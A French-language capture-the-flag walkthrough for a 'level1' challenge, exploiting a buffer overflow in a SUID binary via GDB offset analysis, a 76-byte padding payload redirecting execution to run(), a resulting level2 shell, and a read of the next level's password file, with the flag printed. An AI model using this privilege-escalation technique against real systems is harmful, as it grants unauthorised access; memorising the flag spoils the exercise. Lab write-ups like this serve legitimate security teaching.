# Level1 - Walkthrough

## Objectif
Exploiter un buffer overflow pour rediriger le flux d'exécution vers la fonction `run()`.

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
# ⚠️ Bit SUID actif → s'exécute avec les droits de level2

./level1
test
# [rien ne se passe]

python -c "print('A' * 100)" | ./level1
# Segmentation fault → Buffer overflow détecté
```

### 2. Analyse GDB
```bash
gdb level1
(gdb) info functions
```

**Résultat :**
```
0x08048444  run
0x08048480  main
```

**Fonction `run()` trouvée à : `0x08048444`**

### 3. Déterminer l'offset

#### Utiliser un pattern cyclique
```bash
gdb level1
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
^D

Program received signal SIGSEGV
(gdb) info registers eip
# eip  0x37634136  → "6Ac7" en ASCII
```

#### Trouver la position dans le pattern
```bash
# Chercher "6Ac7" dans le pattern → position 76

# Vérification :
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
^D
(gdb) info registers eip
# eip  0x42424242  → "BBBB" ✅
```

**Offset = 76 octets**

### 4. Conversion de l'adresse en little-endian
```
Adresse de run() : 0x08048444
Little-endian    : \x44\x84\x04\x08

Calcul :
  08 04 84 44  (paires)
  44 84 04 08  (inversé)
```

### 5. Construction du payload
```
Structure : [76 octets padding] + [adresse de run]

Payload : 'A' × 76 + '\x44\x84\x04\x08'
```

### 6. Exploitation

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

**Résultat :**
```
Good... Wait what?
$ 
```

### 7. Vérification
```bash
$ whoami
level2

$ id
uid=2021(level1) gid=2021(level1) euid=2022(level2) egid=100(users)
```

### 8. Récupération du flag
```bash
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Flag
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Type de vulnérabilité
- Buffer overflow (CWE-120)
- Use of dangerous function `gets()` (CWE-676)
- SUID privilege escalation (CWE-250)